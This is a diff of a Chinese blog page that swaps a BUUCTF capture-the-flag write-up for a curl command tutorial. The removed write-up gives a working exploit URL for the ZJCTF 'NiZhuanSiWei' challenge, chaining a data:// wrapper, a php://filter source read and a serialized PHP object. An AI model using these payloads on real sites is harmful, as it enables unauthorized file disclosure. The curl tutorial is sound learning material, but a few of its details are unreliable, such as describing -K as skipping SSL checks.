@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF-ZJCTF做题笔记, Chenluo">
+    <meta name="keywords" content="Curl, Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUUCTF-ZJCTF做题笔记 | Chenluo</title>
+    <title>Curl | Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF-ZJCTF做题笔记</h1>
+                    <h1 class="description center-align post-title">Curl</h1>
                 </div>
             </div>
         </div>
@@ -445,8 +445,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/BUUCTF/">
-                                <span class="chip bg-color">BUUCTF</span>
+                            <a href="/tags/CTFSHOW/">
+                                <span class="chip bg-color">CTFSHOW</span>
                             </a>
                         
                     </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-02
+                    2021-07-29
                 </div>
                 
 
@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    181
+                    1.7k
                 </div>
                 
 
@@ -490,37 +490,192 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><ul>
-<li>直接构造payload:</li>
+                <h1 id="CURL的学习"><a href="#CURL的学习" class="headerlink" title="CURL的学习"></a>CURL的学习</h1><h2 id="基础参数"><a href="#基础参数" class="headerlink" title="基础参数"></a>基础参数</h2><ol>
+<li><h3 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h3></li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> 网址:
+			<span class="token function">curl</span> www.sina.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxj6e2ljrj30ux0ekwkc.jpg" alt="image-20210729084906079"></p>
+<ol start="2">
+<li><h3 id="保存网站文件"><a href="#保存网站文件" class="headerlink" title="保存网站文件"></a>保存网站文件</h3></li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -o <span class="token punctuation">[</span>文件名<span class="token punctuation">]</span> www.sina.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3-自动跳转"><a href="#3-自动跳转" class="headerlink" title="3. 自动跳转"></a>3. 自动跳转</h3><p><code>-L</code>:curl跳转到新的网址</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -L www.sina.com &#x3D;&#x3D;&#x3D; curl www.sina.com.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="4-现实头信息"><a href="#4-现实头信息" class="headerlink" title="4. 现实头信息"></a>4. 现实头信息</h4><p><code>-i</code>：显示<code>http response</code>中的头信息以及网站源码</p>
+<p><code>-I</code>：只显示头信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjelhpwdj30xp0gj44l.jpg" alt="image-20210729085659767"></p>
+<h3 id="5-显示通信过程"><a href="#5-显示通信过程" class="headerlink" title="5. 显示通信过程"></a>5. 显示通信过程</h3><p><code>-v</code>:显示一次<code>http</code>通信过程,包括端口连接和http request头信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjjcgmrnj30xm0jkte1.jpg" alt="image-20210729090132387"></p>
+<h4 id="查看更详细的通信过程"><a href="#查看更详细的通信过程" class="headerlink" title="查看更详细的通信过程"></a>查看更详细的通信过程</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --trace output.txt www.sina.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>或者</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --trace-ascii output.txt www.sina.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>运行后，打开<code>output.txt</code>文件</p>
+<h3 id="6-发送表单信息"><a href="#6-发送表单信息" class="headerlink" title="6. 发送表单信息"></a>6. 发送表单信息</h3><ul>
+<li>get方式</li>
 </ul>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">view-source:http:&#x2F;&#x2F;5e61447f-2d28-46b3-b6b8-8939e1fbded5.node3.buuoj.cn&#x2F;?text&#x3D;data:%2f%2ftext%2fplain,welcome%20to%20the%20zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">curl example.com&#x2F;form.cgi?data&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>第一个利用data协议绕过</p>
-<pre class="line-numbers language-none"><code class="language-none">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>post方式（–data参数）</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">需要指明方式，并且将数据和网址分开
+curl -X POST --data &quot;data&#x3D;xxx&quot; example.com&#x2F;form.cgi
 
-<p>第二个利用php://filter，读取</p>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+POST还可对数据进行编码
+curl -X POST --data-urlencode &quot;data&#x3D;xxx&quot; example.com&#x2F;form.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>第三个序列化</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">&#123;</span>  <span class="token comment">//flag.php</span>
-    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="7-http动词"><a href="#7-http动词" class="headerlink" title="7. http动词"></a>7. http动词</h3><p><code>-X</code>:指定<code>curl</code>的<code>http</code>请求方式,默认是<code>GET</code>方式</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -X POST www.com/form.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Flag"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>最后读取flag时，要将<code>php://filter</code>去掉</p>
+
+<pre class="line-numbers language-none"><code class="language-none">curl -X DELETE www.com&#x2F;fomr.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="8-文件上传"><a href="#8-文件上传" class="headerlink" title="8. 文件上传"></a>8. 文件上传</h3><p>文件上传的表单</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39; action&#x3D;&quot;upload.cgi&quot;&gt;
+　　　　&lt;input type&#x3D;file name&#x3D;upload&gt;
+　　　　&lt;input type&#x3D;submit name&#x3D;press value&#x3D;&quot;OK&quot;&gt;
+　　&lt;&#x2F;form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>--form</code>:上传文件</p>
+<pre class="line-numbers language-none"><code class="language-none">curl --form upload&#x3D;@localfilename --form press&#x3D;OK [URL]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="9-Referer字段"><a href="#9-Referer字段" class="headerlink" title="9. Referer字段"></a>9. Referer字段</h3><p><code>--referer</code>:在<code>http request</code>请求头中提供<code>referer</code>字段</p>
+<pre class="line-numbers language-none"><code class="language-none">curl --referer http:&#x2F;&#x2F;www.example.com http:&#x2F;&#x2F;www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="10-User-Agent字段"><a href="#10-User-Agent字段" class="headerlink" title="10. User Agent字段"></a>10. User Agent字段</h3><p><code>User Agent</code>：用于识别设备信息</p>
+<pre class="line-numbers language-none"><code class="language-none">
+
+Mozilla&#x2F;5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit&#x2F;532.9 (KHTML, like Gecko) Version&#x2F;4.0.5 Mobile&#x2F;8A293 Safari&#x2F;6531.22.7
+　
+　<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --user-agent <span class="token string">"[User Agent]"</span> <span class="token punctuation">[</span>URL<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="11-cookie"><a href="#11-cookie" class="headerlink" title="11. cookie"></a>11. cookie</h3><p><code>--cookie</code>:利用<code>curl</code> 发送<code>cookie</code></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --cookie <span class="token string">"name=xxx"</span> www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="12-添加头信息"><a href="#12-添加头信息" class="headerlink" title="12. 添加头信息"></a>12. 添加头信息</h3><p><code>--header</code>:添加头信息</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --header<span class="token operator">=</span><span class="token string">"Content-Type:application/json"</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="13-HTTP认证"><a href="#13-HTTP认证" class="headerlink" title="13. HTTP认证"></a>13. HTTP认证</h3><p><code>--user</code>:进行<code>http</code>认证</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --user name:password example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="用法指南"><a href="#用法指南" class="headerlink" title="用法指南"></a>用法指南</h2><h3 id="A-User-Agent"><a href="#A-User-Agent" class="headerlink" title="-A(User-Agent)"></a>-A(User-Agent)</h3><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">curl</span> -A <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span> https://google.com
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以移除标头</p>
+<pre class="line-numbers language-none"><code class="language-none">$ curl -A &#39;&#39; https:&#x2F;&#x2F;google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="b-发送cookie"><a href="#b-发送cookie" class="headerlink" title="-b(发送cookie)"></a>-b(发送cookie)</h3><p>向服务器发送<code>cookie</code>参数</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -b <span class="token string">'foo:bar'</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以读取本地文件当作<code>cookie</code></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -b cookie.txt http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="c-保存cookie"><a href="#c-保存cookie" class="headerlink" title="-c(保存cookie)"></a>-c(保存cookie)</h3><p>将服务器的<code>cookie</code>保存到文件</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -c cookie.txt http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="d-POST数据"><a href="#d-POST数据" class="headerlink" title="-d(POST数据)"></a>-d(POST数据)</h3><p>发送<code>POST</code>请求的数据体</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -d <span class="token string">'login=emma＆password=123'</span> -X POST http://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>
+<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -d <span class="token string">'@data.txt'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>
+<h3 id="–data-urlencode-POST编码"><a href="#–data-urlencode-POST编码" class="headerlink" title="–data-urlencode(POST编码)"></a>–data-urlencode(POST编码)</h3><p>对POST数据进行编码</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --data-urlencode <span class="token string">'comment=hello world'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>
+<h3 id="e-referer"><a href="#e-referer" class="headerlink" title="-e(referer)"></a>-e(referer)</h3><p>设置<code>referer</code>头</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -e <span class="token string">'https://google.com?q=example'</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="F-文件"><a href="#F-文件" class="headerlink" title="-F(文件)"></a>-F(文件)</h3><p>传输二进制文件</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -F <span class="token string">'file=@photo.png'</span> https://google.com/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p>
+<p><code>-F</code>参数可以指定 MIME 类型。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -F <span class="token string">'file=@photo.png;type=image/png'</span> https://google.com/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p>
+<p><code>-F</code>参数也可以指定文件名。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -F <span class="token string">'file=@photo.png;filename=me.png'</span> https://google.com/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code>。</p>
+<h3 id="G-查询字符串"><a href="#G-查询字符串" class="headerlink" title="-G(查询字符串)"></a>-G(查询字符串)</h3><p><code>-G</code>构造<code>url</code>查询字符串</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -G -d &#39;q&#x3D;kitties&#39; -d &#39;count&#x3D;20&#39; https:&#x2F;&#x2F;google.com&#x2F;search<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令会发出一个 GET 请求，实际请求的 URL 为<code>https://google.com/search?q=kitties&amp;count=20</code>。如果省略<code>--G</code>，会发出一个 POST 请求。</p>
+<p>如果数据需要 URL 编码，可以结合<code>--data--urlencode</code>参数。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -G --data-urlencode <span class="token string">'comment=hello world'</span> https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="H-设置请求标头"><a href="#H-设置请求标头" class="headerlink" title="-H(设置请求标头)"></a>-H(设置请求标头)</h3><p><code>-H</code>参数添加 HTTP 请求的标头。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -H <span class="token string">'Accept-Language: en-US'</span> https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>添加 HTTP 请求的标头是<code>Content-Type: application/json</code>，然后用<code>-d</code>参数发送 JSON 数据。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -d <span class="token string">'&#123;"login": "emma", "pass": "123"&#125;'</span> -H <span class="token string">'Content-Type: application/json'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="i-I-打印标头"><a href="#i-I-打印标头" class="headerlink" title="-i/I(打印标头)"></a>-i/I(打印标头)</h3><p>打印<code>http response</code>返回的标头以及源码/标头</p>
+<p><code>--head=-I</code></p>
+<pre class="line-numbers language-none"><code class="language-none">curl -I http:&#x2F;&#x2F;example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="K-跳过证书检测"><a href="#K-跳过证书检测" class="headerlink" title="-K(跳过证书检测)"></a>-K(跳过证书检测)</h3><p><code>-k</code>参数指定跳过 SSL 检测。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -K http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令不会检查服务器的<code>SSL</code>证书是否正确。</p>
+<h3 id="L-重定向"><a href="#L-重定向" class="headerlink" title="-L(重定向)"></a>-L(重定向)</h3><p><code>-L</code>参数会让 HTTP 请求跟随服务器的重定向。<code>curl</code>跟随重定向</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -L -d &#39;tweet&#x3D;hi&#39; https:&#x2F;&#x2F;api.twitter.com&#x2F;tweet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="–limit-rate-限制带宽"><a href="#–limit-rate-限制带宽" class="headerlink" title="–limit-rate(限制带宽)"></a>–limit-rate(限制带宽)</h3><p><code>--limit-rate</code>用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> --limit-rate 200k https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令将带宽限制在每秒 200K 字节。</p>
+<h3 id="o-response保存为文件"><a href="#o-response保存为文件" class="headerlink" title="-o(response保存为文件)"></a>-o(response保存为文件)</h3><p>将<code>http response</code>参数保存成文件，相当于<code>wget</code></p>
+<pre class="line-numbers language-none"><code class="language-none">curl -o example.html https:&#x2F;&#x2F;www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="O-response保存为文件"><a href="#O-response保存为文件" class="headerlink" title="-O(response保存为文件)"></a>-O(response保存为文件)</h3><p>将<code>http response</code>参数保存成文件，并用<code>url</code>最后部分当作文件名</p>
+<pre class="line-numbers language-shll" data-language="shll"><code class="language-shll">curl -O https:&#x2F;&#x2F;www.example.com&#x2F;foo&#x2F;bar.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令将服务器回应保存成文件，文件名为<code>bar.html</code>。</p>
+<h3 id="s-不输出错误信息"><a href="#s-不输出错误信息" class="headerlink" title="-s(不输出错误信息)"></a>-s(不输出错误信息)</h3><p><code>curl</code>不输出任何错误信息</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -s https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -s -o /dev/null https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="S-输出错误信息"><a href="#S-输出错误信息" class="headerlink" title="-S(输出错误信息)"></a>-S(输出错误信息)</h3><p><code>-S</code>参数指定只输出错误信息，通常与<code>-s</code>一起使用。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -S -o /dev/null https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面的命令不会输出信息，除非报错</p>
+<h3 id="u-设置服务器认证"><a href="#u-设置服务器认证" class="headerlink" title="-u(设置服务器认证)"></a>-u(设置服务器认证)</h3><p><code>-u</code>参数用来设置服务器认证的用户名和密码。</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -u &#39;boo:1234&#39; https:&#x2F;&#x2F;google.com&#x2F;login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>设置用户名为<code>boo</code>密码为<code>1234</code>，然后将其转为 HTTP 标头<code>Authorization: Basic Ym9iOjEyMzQ1</code>。</p>
+<p><code>curl</code> 能够识别<code>URL</code>里面的用户名和密码。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> https://bob:12345@google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="v-输出通信过程"><a href="#v-输出通信过程" class="headerlink" title="-v(输出通信过程)"></a>-v(输出通信过程)</h3><p><code>-v</code>参数，输出通信的整个过程，进行调试</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -v https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>--trace</code>参数也可以用于调试，还会输出原始的二进制数据。</p>
+<h3 id="x-指定代理"><a href="#x-指定代理" class="headerlink" title="-x(指定代理)"></a>-x(指定代理)</h3><p><code>-x</code>参数指定<code>HTTP</code>请求的代理。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -x socks5://james:cats@myproxy.com:8080 https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面命令指定 HTTP 请求通过<code>myproxy.com:8080</code>的 socks5 代理发出。</p>
+<p>如果没有指定代理协议，默认为 HTTP。</p>
+<h3 id="X-指定请求方式"><a href="#X-指定请求方式" class="headerlink" title="-X(指定请求方式)"></a>-X(指定请求方式)</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -X POST https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>对<code>https://www.example.com</code>发出 POST 请求。</p>
 
                 
             </div>
@@ -547,7 +702,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/06/02/7890.html">http://echo-machile.github.io/2021/06/02/7890.html</a>
+                    <a href="http://echo-machile.github.io/2021/07/29/745.html">http://echo-machile.github.io/2021/07/29/745.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -585,8 +740,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/BUUCTF/">
-                                    <span class="chip bg-color">BUUCTF</span>
+                                <a href="/tags/CTFSHOW/">
+                                    <span class="chip bg-color">CTFSHOW</span>
                                 </a>
                             
                         </div>
@@ -1044,13 +1199,13 @@ document.body.addEventListener('click', function(e) {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/06/02/767.html">
+                <a href="/2021/07/29/7734.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="BUUCTF-MRCTF做题笔记">
+                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="ctfshow-ssti注入">
                         
-                        <span class="card-title">BUUCTF-MRCTF做题笔记</span>
+                        <span class="card-title">ctfshow-ssti注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1061,7 +1216,7 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-02
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
                         </span>
                         <span class="publish-author">
                             
@@ -1074,8 +1229,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
                     </a>
                     
                 </div>
@@ -1089,13 +1244,13 @@ document.body.addEventListener('click', function(e) {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/02/790.html">
+                <a href="/2021/07/19/7676.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="BUUCTF-网鼎杯做题笔记">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="ctfshow-文件上传">
                         
-                        <span class="card-title">BUUCTF-网鼎杯做题笔记</span>
+                        <span class="card-title">ctfshow-文件上传</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1106,7 +1261,7 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-19
                             </span>
                         <span class="publish-author">
                             
@@ -1119,8 +1274,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
                     </a>
                     
                 </div>
